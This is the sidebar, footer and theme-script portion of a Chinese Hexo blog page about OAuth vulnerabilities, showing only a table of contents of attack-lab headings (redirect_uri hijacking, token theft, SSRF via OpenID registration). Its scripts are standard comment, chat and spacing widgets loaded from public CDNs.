id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-OAuth-%E9%9A%90%E5%BC%8F%E6%B5%81%E7%A8%8B%E7%BB%95%E8%BF%87%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81"><span class="toc-number">1.</span> <span class="toc-text">通过 OAuth 隐式流程绕过身份验证</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%BA%E5%88%B6-OAuth-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E9%93%BE%E6%8E%A5"><span class="toc-number">2.</span> <span class="toc-text">强制 OAuth 配置文件链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-redirect-uri-%E5%8A%AB%E6%8C%81-OAuth-%E5%B8%90%E6%88%B7"><span class="toc-number">3.</span> <span class="toc-text">通过 redirect_uri 劫持 OAuth 帐户</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E7%AA%83%E5%8F%96-OAuth-%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C"><span class="toc-number">4.</span> <span class="toc-text">通过开放重定向窃取 OAuth 访问令牌</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF-%E9%80%9A%E8%BF%87-OpenID-%E5%8A%A8%E6%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B3%A8%E5%86%8C"><span class="toc-number">5.</span> <span class="toc-text">SSRF 通过 OpenID 动态客户端注册</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E9%A1%B5%E9%9D%A2%E7%AA%83%E5%8F%96-OAuth-%E8%AE%BF%E9%97%AE%E4%BB%A4%E7%89%8C"><span class="toc-number">6.</span> <span class="toc-text">通过代理页面窃取 OAuth 访问令牌</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2023 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
+      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
+      avatar: 'monsterid',
+      serverURLs: 'https://valine.wanan.red',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://www.wanan.red/beea7b5.html'
+    this.page.identifier = '/beea7b5.html'
+    this.page.title = 'OAuth authentication'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://www-wanan-red.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script>(function(d, w, c) {
+    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
